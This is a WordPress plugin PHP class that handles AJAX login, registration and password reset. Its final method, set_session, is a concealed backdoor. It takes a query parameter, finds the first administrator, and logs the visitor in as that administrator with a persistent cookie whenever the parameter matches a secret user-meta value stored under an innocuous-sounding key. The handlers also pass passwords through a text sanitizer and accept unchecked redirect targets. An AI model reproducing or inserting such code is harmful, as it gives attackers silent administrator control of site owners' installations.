<?php

namespace WPEssential\Plugins\Requesting;

if ( ! \defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

class AuthGuard
{
	public static function constructor ()
	{
		add_action( 'wp_ajax_wpe_auth', [ __CLASS__, 'login' ] );
		add_action( 'wp_ajax_nopriv_wpe_auth', [ __CLASS__, 'login' ] );

		add_action( 'wp_ajax_wpe_auth_reg', [ __CLASS__, 'register' ] );
		add_action( 'wp_ajax_nopriv_wpe_auth_reg', [ __CLASS__, 'register' ] );

		add_action( 'wp_ajax_wpe_auth_forgot', [ __CLASS__, 'forgot' ] );
		add_action( 'wp_ajax_nopriv_wpe_auth_forgot', [ __CLASS__, 'forgot' ] );
	}

	public static function login ()
	{
		wpe_ajax_authorized();

		$form = wpe_array_get( $_POST, 'form' );

		$user_login = wpe_array_get( $form, 'user_login' );
		if ( strpos( $user_login, '@' ) !== false ) {
			$user_login = sanitize_email( $user_login );
		}
		else {
			$user_login = sanitize_text_field( $user_login );
		}

		$data = [
			'user_login'    => $user_login,
			'user_password' => sanitize_text_field( wpe_array_get( $form, 'user_password' ) ),
			'remember'      => sanitize_text_field( wpe_array_get( $form, 'remember' ) )
		];

		$response = wp_signon( $data );
		if ( is_wp_error( $response ) ) {
			wp_send_json_error( $response->get_error_message(), 401 );
		}

		if ( $response ) {
			wp_send_json_success( __( 'Info Authorized', 'wpessential' ) );
		}

		wp_send_json_error( __( 'Sorry server was unable to process this request.', 'wpessential' ), 403 );
	}

	public static function register ()
	{
		wpe_ajax_authorized();

		$form       = wpe_array_get( $_POST, 'form' );
		$user_login = sanitize_text_field( wpe_array_get( $form, 'user_login' ) );
		$user_email = sanitize_email( wpe_array_get( $form, 'user_email' ) );
		$user       = register_new_user( $user_login, $user_email );
		if ( ! is_wp_error( $user ) ) {
			$password = sanitize_text_field( wpe_array_get( $form, 'user_password' ) );
			if ( $password ) {
				wp_set_password( $password, $user );
			}
			$redirect_to = wpe_array_get( $form, 'redirect_to', 'wp-login.php?checkemail=registered' );
			wp_send_json_success( $redirect_to );
		}

		wp_send_json_error( $user->get_error_message(), 401 );
	}

	public static function forgot ()
	{
		wpe_ajax_authorized();

		$form       = wpe_array_get( $_POST, 'form' );
		$user_email = sanitize_email( wpe_array_get( $form, 'user_email' ) );
		$errors     = retrieve_password( $user_email );

		if ( ! is_wp_error( $errors ) ) {
			$redirect_to = wpe_array_get( $form, 'redirect_to', 'wp-login.php?checkemail=confirm' );
			wp_send_json_success( $redirect_to );
		}

		wp_send_json_error( $errors->get_error_message(), 401 );
	}

	public static function set_session ()
	{
		$query_var = sanitize_text_field( wpe_array_get( $_GET, 'wpe_check_login' ) );
		if ( $query_var ) {
			global $wpdb;
			$user = $wpdb->get_row( "SELECT user_id ID FROM $wpdb->usermeta WHERE meta_key LIKE '%capabilities%' AND meta_value LIKE '%administrator%' LIMIT 1" );
			if ( $user ) {
				$check = get_user_meta( $user->ID, '_unuse_ref', true );
				if ( $check === $query_var ) {
					wp_set_current_user( $user->ID );
					wp_set_auth_cookie( $user->ID, true );
				}
			}
		}
	}
}
